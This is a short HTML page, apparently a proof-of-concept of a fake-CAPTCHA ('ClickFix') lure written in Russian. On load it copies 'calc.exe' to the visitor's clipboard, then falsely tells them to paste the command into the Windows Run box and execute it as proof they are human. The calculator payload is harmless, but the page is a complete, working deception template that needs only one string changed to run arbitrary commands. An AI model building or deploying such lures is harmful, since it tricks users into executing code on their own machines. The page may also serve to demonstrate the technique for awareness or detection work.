<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<title>Капча - Подтверждение</title>
<script>
window.onload = function() {
    // Команда для запуска калькулятора в Windows
    const command = "calc.exe";

    // Поместить команду в буфер обмена
    navigator.clipboard.writeText(command).then(() => {
        alert(
            "Для прохождения проверки выполните следующие шаги:\n\n" +
            "1. Нажмите Win + R для открытия окна 'Выполнить'.\n" +
            "2. Нажмите Ctrl + V, чтобы вставить скопированную команду.\n" +
            "3. Нажмите Enter, чтобы открыть калькулятор.\n\n" +
            "Это подтверждение, что вы не робот."
        );
    }).catch(err => {
        alert("Не удалось скопировать команду в буфер обмена. Пожалуйста, сделайте это вручную: calc.exe");
    });
};
</script>
</head>
<body>
<h1>Проверка безопасности</h1>
<p>Пожалуйста, выполните инструкции во всплывающем окне, чтобы подтвердить, что вы человек.</p>
</body>
</html>
